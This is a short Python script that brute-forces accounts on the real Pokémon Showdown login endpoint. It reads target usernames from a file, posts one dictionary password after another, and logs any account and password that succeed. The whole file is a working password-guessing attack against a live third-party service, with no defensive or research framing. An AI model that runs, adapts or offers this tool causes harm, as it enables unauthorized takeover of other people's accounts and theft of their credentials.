"""
@author: DavidGrey
"""

import os
import inspect
import requests
from re import findall

PATH = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))

def login(account, passwd):
    """Takes an account name and password
    as arguments and returns true
    if the login is successful
    otherwise returns []"""
    request = requests.post("http://play.pokemonshowdown.com/~~showdown/action.php",
                            data={'act': "login",
                                  'name': account,
                                  'pass': passwd,
                                  'challengekeyid': '3',
                                  'challenge': ""})

    return findall("\"loggedin\":true", str(request.text))


def account_crack(account, dictionary):
    """Takes an account name and dictionary
    as arguments and attempts to brute force
    the account given account by with the dictionary"""
    trys = 0
    with open(dictionary) as dic:
        for passwd in dic:
            passwd = passwd.rstrip()
            try:
                if login(account, passwd):
                    with open(PATH+'\\logs.txt', 'a') as logs:
                        logs.write(account+": "+passwd+'\n')
                    print('\n'*100)
                    print(account+": "+passwd)
                else:
                    trys += 1
                    print(dictionary)
                    print(account)
                    print(str(trys)+': '+passwd)
            except:
                trys += 1


with open(PATH+"\\target.txt") as p:
    G_DICTIONARY = PATH + '\\dict'+findall('[0-9]+', os.path.basename(__file__))[0]+'.txt'
    for G_ACCOUNT in p:
        G_ACCOUNT = G_ACCOUNT.rstrip()
        print(account_crack(G_ACCOUNT, G_DICTIONARY))
